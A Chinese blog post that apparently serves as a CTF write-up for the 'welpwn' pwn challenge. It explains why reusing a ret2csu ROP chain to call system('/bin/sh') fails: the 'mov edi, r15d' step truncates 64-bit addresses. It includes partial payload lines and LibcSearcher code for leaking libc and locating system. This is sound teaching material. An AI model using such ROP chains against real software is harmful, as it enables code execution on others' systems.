---
layout: post
title: 'ROP gadget的一些遇到的问题和思考'
subtitle: 'ROP gadget的一些遇到的问题和思考'
date: 2021-03-28
categories: 技术
tags: rop
---

发个好久之前写的把。（现在一看那时候可真呆，滑稽.jpg）

今天总算搞明白了之前没懂的疑问
看过64位的rop应该知道一般的rop都会调用下面的gadgets
因为正常编译出来的都会有这两个函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020120621571958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

正常的思路都是利用puts函数和write函数来泄露别的函数的真实地址，然后去连libc
当利用write函数做泄露的时候因为要传3个参数，所以肯定会用到这一整段gadgets
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215732207.png)

然后一般第一段payload就一般是
payload=‘A’offset+p64(ppppppr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)
payload+=p64(mmmc)+'A'56
payload+=p64(start_addr)
当然我要讲的不是这一段payload，而是下面这段
发送第一段payload之后我们可以得到write（当然不一定一定要write函数，我习惯用write）的真实地址write_addr
然后就可以拿到libc库（我比较喜欢用LibcSearcher，使用起来感觉比dynelf简单）
libc=LibcSearcher('write',write_addr)
base_addr=write_addr-libc.dump('write')
system_addr=base_addr+libc.dump('system')
sh_addr=base_addr+libc.dump('str_bin_sh')
得到system和sh后就思路清晰了，要调用system，参数‘/bin/sh’
然后下面就是我要讲的了，我刚刚学的时候觉得直接把上面上一段的payload参数改一下不就好了吗？长度都不用变，都当一个万能模块使用了，就像这样：
payload=‘A’offset+p64(ppppppr)+p64(0)+p64(1)+p64(sys)+p64(8)+p64(write_got)+p64(1)
payload+=p64(mmmc)+'A'56
payload+=p64(start_addr)
这个逻辑上是没有问题的，但是运行后却没有我们想要的执行system('/bin/sh')
当时抓破脑袋都不晓得为啥
后来熟练了一下gdb.attach()，今天调了了调，终于懂了
那么我先按照我上面的思路来一遍
我随便拿了一道
这里的pop4比较特殊就不用管他，后面的和正常的是一样的
exp
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215746760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

我用了gdb.attach()来查看为啥8行
咱先把第一段payload发了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215803241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

顺便在函数返回的地方ret下个断点，这样我们就能看见我们的payload干了啥了，顺便就直接c 运行到这个断点
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215814525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

第一段payload的话是为了泄露write的地址，我就不进去看了
再次c，这样我们第二段payload就已经发送了，并且返回到ret的地方
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215826369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

然后就是第二payload在干的事情了，我们n进去
第一个是pop4，不用管，由于题目有特殊的东西，所以有这个
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215840180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

第二个是6个pop
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215850313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

下面是6个pop执行完后的状态，这里注意寄存器的值，都在掌控之中
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215858428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

但接下来就是问题出来的地方了
mov rdi,r15d
r15d的值取的是r15的前32位，而我们sh字符串的真实地址比较大，32位没能装下，那么传给rdi的时候数据就丢失了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020120621591439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

我们来执行这条命令看
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020120621592598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

果然传过去的时候地址的高位莫得了，那么那个地址指向的也就是不是‘bin/sh’字符串了

当然正常的第二段payload大家应该都鸡到啦，
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215936385.png)

0x4008A2开始的两条命令是
pop r15
ret
那么0x4008A3开始的两条命令是
pop edi
ret
这也是汇编指令神奇的地方，amazing
正确exp：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201206215947231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTk1NzMy,size_16,color_FFFFFF,t_70)

有兴趣的可以做一下
题目名称welpwn
攻防世界也有的

觉得哪里不太对的也提出来鸭，我就一菜鸡，不知道哪里思路会不会错
觉得还可以的点个赞（滑稽.jpg）
